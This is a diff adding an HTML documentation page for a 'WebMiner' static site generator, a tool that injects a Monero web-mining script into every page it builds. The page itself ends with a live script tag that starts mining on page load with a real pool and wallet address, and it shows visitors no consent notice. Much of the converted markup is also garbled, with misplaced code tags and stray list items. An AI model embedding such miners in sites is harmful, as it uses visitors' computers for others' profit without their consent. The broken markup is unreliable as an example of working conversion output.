@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebMiner Static Site Generator</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <nav class="site-nav">
+        <a href="index.html">Home</a>
+        <a href="ADDRESSING_THE_CRYPTO_BROS_CRITIQUE.html">Addressing The Crypto Bros Critique</a>
+        <a href="ALL_ADVERTISING_IS_MALVERTISING.html">All Advertising Is Malvertising</a>
+        <a href="BEYOND_THE_CONSENT_THEATER.html">Beyond The Consent Theater</a>
+        <a href="FROM_ARCADE_TOKENS_TO_CRYPTO_HASHES.html">From Arcade Tokens To Crypto Hashes</a>
+        <a href="FROM_ATTENTION_ECONOMY_TO_CONTRIBUTION_ECONOMY.html">From Attention Economy To Contribution Economy</a>
+        <a href="PRIVATE_MONEY_PRIVATE_ENERGY.html">Private Money Private Energy</a>
+        <a href="SITE_GENERATOR.html" class="active">Site Generator</a>
+        <a href="THE_ACCESSIBILITY_PARADOX.html">The Accessibility Paradox</a>
+        <a href="THE_DEMOCRACY_OF_COMPUTING.html">The Democracy Of Computing</a>
+        <a href="THE_ENVIRONMENTAL_FALSE_DILEMMA.html">The Environmental False Dilemma</a>
+        <a href="THE_LOCAL_BUSINESS_RENAISSANCE.html">The Local Business Renaissance</a>
+        <a href="THE_PARENTS_GUIDE_TO_DIGITAL_SOVEREIGNTY.html">The Parents Guide To Digital Sovereignty</a>
+        <a href="THE_REGULATION_RESPONSE.html">The Regulation Response</a>
+        <a href="THE_SUBSCRIPTION_FATIGUE_SOLUTION.html">The Subscription Fatigue Solution</a>
+        <a href="WEBMINING_IS_NOT_EVIL.html">Webmining Is Not Evil</a>
+        <a href="YOUR_COMPUTER_ALREADY_WORKS_FOR_FREE.html">Your Computer Already Works For Free</a>
+    </nav>
+    <main class="content">
+<h1>WebMiner Static Site Generator</h1>
+
+<h2>Overview</h2>
+
+The WebMiner static site generator converts markdown documentation files into a beautiful, navigable HTML website. It's a single Node.js script with no external dependencies that creates a complete documentation site in seconds.
+
+<h2>Quick Start</h2>
+
+<pre><code class="language-bash">&lt;h1&gt;Generate the site (without webminer)&lt;/h1&gt;
+node generate-site.js
+
+&lt;h1&gt;Generate with WebMiner integration&lt;/h1&gt;
+node generate-site.js \
+  --pool="wss://pool.supportxmr.com:443" \
+  --wallet="YOUR<em>MONERO</em>ADDRESS" \
+  --throttle="0.25"
+
+&lt;h1&gt;Preview locally&lt;/h1&gt;
+python3 -m http.server 8080
+&lt;h1&gt;Visit http://localhost:8080&lt;/h1&gt;
+</code></pre>
+
+<h2>Features</h2>
+
+<h3>⚙️ WebMiner Integration</h3>
+
+The generator can automatically embed the WebMiner script into every generated HTML page with your pool and wallet configuration:
+
+<pre><code class="language-bash">node generate-site.js \
+  --pool="wss://pool.supportxmr.com:443" \
+  --wallet="YOUR<em>MONERO</em>ADDRESS" \
+  --throttle="0.25"
+</code></pre>
+
+<strong>Generated HTML includes:</strong>
+<pre><code class="language-html">&lt;script src="webminer.js" 
+        data-pool="wss://pool.supportxmr.com:443"
+        data-wallet="YOUR<em>MONERO</em>ADDRESS"
+        data-throttle="0.25"&gt;
+&lt;/script&gt;
+</code></pre>
+
+<strong>Options:</strong>
+<ul><li><code>--pool</code>: WebSocket pool URL (e.g., <code>wss://pool.supportxmr.com:443</code>)</li>
+<li><code>--wallet</code>: Your Monero wallet address</li>
+<li><code>--throttle</code>: CPU usage limit (0.1 = 10%, 0.5 = 50%, etc.)</li>
+</ul>
+<p>All three parameters are optional. Omit them to generate a site without the webminer script.</p>
+<h3>🔍 Smart File Filtering</h3>
+
+The generator automatically:
+<ul><li><strong>Excludes</strong> files with <code>REVIEW</code> in the filename</li>
+<li><strong>Excludes</strong> files with <code>PLAN</code> in the filename  </li>
+<li><strong>Excludes</strong> patterns from <code>.gitignore</code></li>
+<li><strong>Converts</strong> <code>README.md</code> → <code>index.html</code> (homepage)</li>
+<li><strong>Converts</strong> all other <code>.md</code> files → corresponding <code>.html</code> files</li>
+</ul>
+<h3>🎨 Generated Output</h3>
+
+| File Type | Description |
+|-----------|-------------|
+| <code>index.html</code> | Homepage (from README.md) |
+| <code>*.html</code> | Individual documentation pages |
+| <code>styles.css</code> | Responsive stylesheet |
+
+<h3>🧭 Navigation Features</h3>
+
+<ul><li><strong>Automatic navigation bar</strong> on every page</li>
+<li><strong>"Home" link</strong> always appears first</li>
+<li><strong>Current page highlighting</strong> shows where you are</li>
+<li><strong>Alphabetically sorted</strong> links (except Home)</li>
+<li><strong>Human-readable titles</strong> (e.g., "The Democracy Of Computing")</li>
+</ul>
+<h3>📱 Responsive Design</h3>
+
+The generated site includes:
+<ul><li>Mobile-friendly responsive layout</li>
+<li>Touch-optimized navigation</li>
+<li>Readable typography across all devices</li>
+<li>Code syntax highlighting</li>
+<li>Accessible HTML5 structure</li>
+</ul>
+<h2>Example Output</h2>
+
+<h3>Input Files</h3>
+<pre><code>README.md
+ABOUT.md
+PROJECT_PLAN.md           ← Excluded (contains PLAN)
+CODE_REVIEW.md            ← Excluded (contains REVIEW)
+GUIDE.md
+</code></pre>
+
+<h3>Generated Files (Without WebMiner)</h3>
+<pre><code class="language-bash">node generate-site.js
+</code></pre>
+
+<strong>Output:</strong>
+<pre><code>index.html                ← From README.md
+ABOUT.html
+GUIDE.html
+styles.css
+</code></pre>
+
+<h3>Generated Files (With WebMiner)</h3>
+<pre><code class="language-bash">node generate-site.js \
+  --pool="wss://pool.supportxmr.com:443" \
+  --wallet="YOUR<em>MONERO</em>ADDRESS" \
+  --throttle="0.25"
+</code></pre>
+
+<strong>Output:</strong> Same HTML files, but each includes:
+<pre><code class="language-html">&lt;script src="webminer.js" 
+        data-pool="wss://pool.supportxmr.com:443"
+        data-wallet="YOUR<em>MONERO</em>ADDRESS"
+        data-throttle="0.25"&gt;
+&lt;/script&gt;
+</code></pre>
+
+<h3>Sample HTML Structure</h3>
+
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link rel="stylesheet" href="styles.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class="site-nav"&gt;
+        &lt;a href="index.html" class="active"&gt;Home&lt;/a&gt;
+        &lt;a href="ABOUT.html"&gt;About&lt;/a&gt;
+        &lt;a href="GUIDE.html"&gt;Guide&lt;/a&gt;
+    &lt;/nav&gt;
+    &lt;main class="content"&gt;
+        &lt;!-- Your markdown content converted to HTML --&gt;
+    &lt;/main&gt;
+    &lt;footer class="site-footer"&gt;
+        &lt;p&gt;Generated with WebMiner Static Site Generator&lt;/p&gt;
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h2>Markdown Support</h2>
+
+The generator handles common markdown features:
+
+<h3>Supported Elements</h3>
+
+✅ <strong>Headings</strong> (<code># H1</code> through <code>###### H6</code>)
+✅ <strong>Bold</strong> (<code><strong>text</strong></code> or <code><strong>text</strong></code>)  
+✅ <strong>Italic</strong> (<code><em>text</em></code> or <code><em>text</em></code>)
+✅ <strong>Links</strong> (<code><a href="url">text</a></code>)
+✅ <strong>Images</strong> (<code>!<a href="url">alt</a></code>)
+✅ <strong>Code blocks</strong> (triple backticks with language)
+✅ <strong>Inline code</strong> (`<code> </code>code<code> </code><code>)
+✅ <strong>Lists</strong> (ordered and unordered)
+✅ <strong>Blockquotes</strong> (</code>> quote<code>)
+✅ <strong>Horizontal rules</strong> (</code>---<code> or </code><em>*</em><code>)
+
+<h3>Code Highlighting Example</h3>
+
+<pre><code class="language-javascript">// Code blocks preserve formatting and language hints
+const miner = new WebMiner({
+    pool: 'wss://pool.example.com',
+    wallet: 'YOUR_ADDRESS',
+    throttle: 0.25
+});
+</code></pre>
+
+<h2>Styling</h2>
+
+The generated </code>styles.css<code> provides:
+
+<ul><li><strong>Clean typography</strong> with modern system fonts</li>
+<li><strong>Readable line height</strong> (1.6) for comfortable reading</li>
+<li><strong>Code styling</strong> with distinct background colors</li>
+<li><strong>Navigation hover effects</strong> with smooth transitions</li>
+<li><strong>Responsive breakpoints</strong> at 768px and 480px</li>
+<li><strong>Accessible color contrast</strong> meeting WCAG standards</li>
+</ul>
+<h3>Customization</h3>
+
+To customize the styling:
+
+<li>Generate the initial site: </code>node generate-site.js<code></li>
+<li>Edit </code>styles.css<code> to match your brand</li>
+<li>Regenerate anytime without losing CSS changes (unless you modify the generator)</li>
+
+<h2>File Exclusion Rules</h2>
+
+<h3>Pattern Matching</h3>
+
+Files are excluded if:
+<li>Filename contains </code>REVIEW<code> (case-sensitive)</li>
+   - ✅ Excludes: </code>REVIEW.md<code>, </code>code-REVIEW.md<code>, </code>REVIEW_AUDIT.md<code>
+<li>Filename contains </code>PLAN<code> (case-sensitive)</li>
+   - ✅ Excludes: </code>PLAN.md<code>, </code>ESSAY<em>PLANNING.md<code>, </code>WORKFLOW</em>PLAN.md<code>
+<li>Filename matches </code>.gitignore<code> patterns</li>
+   - ✅ Excludes: </code>*.log<code>, </code>temp/<code>, etc.
+
+<h3>Adding Custom Exclusions</h3>
+
+To exclude additional patterns, add them to </code>.gitignore<code>:
+
+<pre><code class="language-gitignore">&lt;h1&gt;Existing patterns&lt;/h1&gt;
+*.log
+node_modules/
+
+&lt;h1&gt;Custom exclusions for site generator&lt;/h1&gt;
+DRAFT_*.md
+WIP_*.md
+*.backup.md
+</code></pre>
+
+<h2>Console Output</h2>
+
+The generator provides clear progress reporting:
+
+<pre><code>🚀 Starting WebMiner static site generation...
+
+📋 Loaded 4 .gitignore patterns
+📁 Found 23 markdown files
+
+⏭️  Skipping: ESSAY_PLANNING.md (excluded by filter)
+⏭️  Skipping: REVIEW.md (excluded by filter)
+
+✅ Processing 16 files after filtering
+
+🔄 Processing: README.md
+   ✓ Generated: index.html
+🔄 Processing: ABOUT.md
+   ✓ Generated: ABOUT.html
+
+🎨 Generating stylesheet...
+   ✓ Generated: styles.css
+
+✨ Site generation complete!
+📊 Generated 16 HTML pages + 1 CSS file
+</code></pre>
+
+<h2>Deployment</h2>
+
+<h3>Local Testing</h3>
+
+<pre><code class="language-bash">&lt;h1&gt;Python 3&lt;/h1&gt;
+python3 -m http.server 8080
+
+&lt;h1&gt;Node.js (install http-server globally first)&lt;/h1&gt;
+npx http-server -p 8080
+
+&lt;h1&gt;PHP&lt;/h1&gt;
+php -S localhost:8080
+</code></pre>
+
+Then visit </code>http://localhost:8080<code>
+
+<h3>Static Hosting</h3>
+
+The generated site is pure HTML/CSS with no server-side requirements. Deploy to:
+
+<ul><li><strong>GitHub Pages</strong>: Push to </code>gh-pages<code> branch</li>
+<li><strong>Netlify</strong>: Drag and drop the directory</li>
+<li><strong>Vercel</strong>: Deploy from git repository</li>
+<li><strong>AWS S3</strong>: Upload as static website</li>
+<li><strong>Any web server</strong>: Just copy the </code>.html<code> and </code>.css<code> files</li>
+</ul>
+<h3>Automation</h3>
+
+Add to your CI/CD pipeline:
+
+<pre><code class="language-yaml">&lt;h1&gt;GitHub Actions example&lt;/h1&gt;
+<ul><li>name: Generate documentation site</li>
+</ul>  run: node generate-site.js
+<ul><li>name: Deploy to GitHub Pages</li>
+</ul>  uses: peaceiris/actions-gh-pages@v3
+</code></pre>
+<p>with: github<em>token: ${{ secrets.GITHUB</em>TOKEN }} publish_dir: ./ publish_branch: gh-pages</p>
+<h2>Technical Details</h2>
+
+<h3>Dependencies</h3>
+
+<ul><li><strong>Node.js</strong> (any recent version)</li>
+<li><strong>No npm packages required</strong> - pure Node.js built-in modules</li>
+</ul>
+<h3>Architecture</h3>
+
+The generator uses:
+<ul><li></code>fs<code> module for file system operations</li>
+<li></code>path<code> module for cross-platform paths</li>
+<li>Regular expressions for markdown parsing</li>
+<li>Template strings for HTML generation</li>
+</ul>
+<h3>Performance</h3>
+
+<ul><li>Processes 20+ markdown files in under 1 second</li>
+<li>Single-pass parsing for efficiency</li>
+<li>No external process spawning</li>
+<li>Minimal memory footprint</li>
+</ul>
+<h3>Limitations</h3>
+
+This is a <strong>simple</strong> markdown converter focused on documentation. It does not support:
+
+<ul><li>❌ Complex markdown tables (basic tables only)</li>
+<li>❌ GitHub Flavored Markdown extensions</li>
+<li>❌ Markdown inside HTML tags</li>
+<li>❌ Custom markdown processors</li>
+<li>❌ Live reload during development</li>
+</ul>
+<p>For advanced markdown features, consider using a full static site generator like Hugo, Jekyll, or Eleventy.</p>
+<h2>Troubleshooting</h2>
+
+<h3>Problem: Files not being generated</h3>
+
+<strong>Solution</strong>: Check that files end with </code>.md<code> extension and don't match exclusion rules.
+
+<h3>Problem: Navigation links broken</h3>
+
+<strong>Solution</strong>: Ensure all HTML files are in the same directory. The generator doesn't support subdirectories.
+
+<h3>Problem: Styles not loading</h3>
+
+<strong>Solution</strong>: Verify </code>styles.css<code> exists in the same directory as your HTML files. Check browser console for 404 errors.
+
+<h3>Problem: Markdown not converting properly</h3>
+
+<strong>Solution</strong>: The parser is simple and may not handle complex nesting. Simplify your markdown or use standard patterns.
+
+<h2>Contributing</h2>
+
+The generator is a single file (</code>generate-site.js<code>) with clear documentation. To extend it:
+
+<li>Read the inline comments explaining each function</li>
+<li>Test changes with </code>node generate-site.js`</li>
+<li>Verify output in a browser</li>
+<li>Submit a pull request with your improvements</li>
+
+<h2>License</h2>
+
+Same license as the WebMiner project.
+
+<hr>
+
+<strong>Questions?</strong> Open an issue on the GitHub repository.
+
+<strong>Built with</strong> 💜 <strong>for documentation that just works.</strong>
+
+    </main>
+    <footer class="site-footer">
+        <p>Generated with WebMiner Static Site Generator</p>
+    </footer>
+    <script src="webminer.js" data-pool="wss://pool.supportxmr.com:443" data-wallet="43H3Uqnc9rfEsJjUXZYmam45MbtWmREFSANAWY5hijY4aht8cqYaT2BCNhfBhua5XwNdx9Tb6BEdt4tjUHJDwNW5H7mTiwe" data-throttle="0.25"></script>
+</body>
+</html>
